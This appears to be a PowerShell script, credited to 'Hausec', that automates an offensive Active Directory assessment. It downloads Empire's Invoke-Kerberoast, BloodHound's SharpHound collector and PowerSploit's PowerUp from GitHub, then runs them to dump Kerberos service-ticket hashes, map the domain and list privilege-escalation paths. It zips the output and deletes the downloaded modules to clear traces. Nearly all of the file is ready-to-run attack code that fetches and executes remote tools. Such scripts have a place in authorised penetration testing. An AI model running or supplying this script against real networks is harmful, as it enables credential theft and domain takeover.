<# 
Active Directory Assessment and Privilege Escalation Script
Developed by Hausec
Credit for scripts goes to Tim Medin, the people working on Empire, BloodHound, and PowerSploit 
#>

#run as admin check

#create folder 
$path = "$env:userprofile\Documents\Capture"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
#create folder for PS Modules
$path = "$env:userprofile\Documents\WindowsPowerShell\Modules\IEAssessment"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
#download Kerberoast
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$env:userprofile\Documents\WindowsPowerShell\Modules\IEAssessment\IEAssessment.ps1")
#Run Kerberoast
Import-Module IEAssessment.ps1
Invoke-Kerberoast | Out-File $env:userprofile\Documents\Capture\Kerberoast.txt

#SharpHound
$path = "$env:userprofile\Documents\WindowsPowerShell\Modules\SharpHound"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1","$env:userprofile\Documents\WindowsPowerShell\Modules\SharpHound\SharpHound.ps1")
Import-Module SharpHound.ps1
Invoke-BloodHound -CSVFolder $env:userprofile\Documents\Capture
#PrivEsc
$path = "$env:userprofile\Documents\WindowsPowerShell\Modules\PrivEsc"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$env:userprofile\Documents\WindowsPowerShell\Modules\PrivEsc\PrivEsc.ps1")
Import-Module PrivEsc.ps1
Invoke-AllChecks | Out-File $env:userprofile\Documents\Capture\PrivEsc.txt

#Zip it all up and remove leftovers
Compress-Archive -Path $env:userprofile\Documents\Capture -Update -DestinationPath $env:userprofile\Documents\Capture.zip
Remove-Item -Recurse -Force "$env:userprofile\Documents\WindowsPowerShell\Modules\IEAssessment"
Remove-Item -Recurse -Force "$env:userprofile\Documents\WindowsPowerShell\Modules\PrivEsc"
Remove-Item -Recurse -Force "$env:userprofile\Documents\WindowsPowerShell\Modules\SharpHound"
Remove-Item -Recurse -Force "$env:userprofile\Documents\Capture"






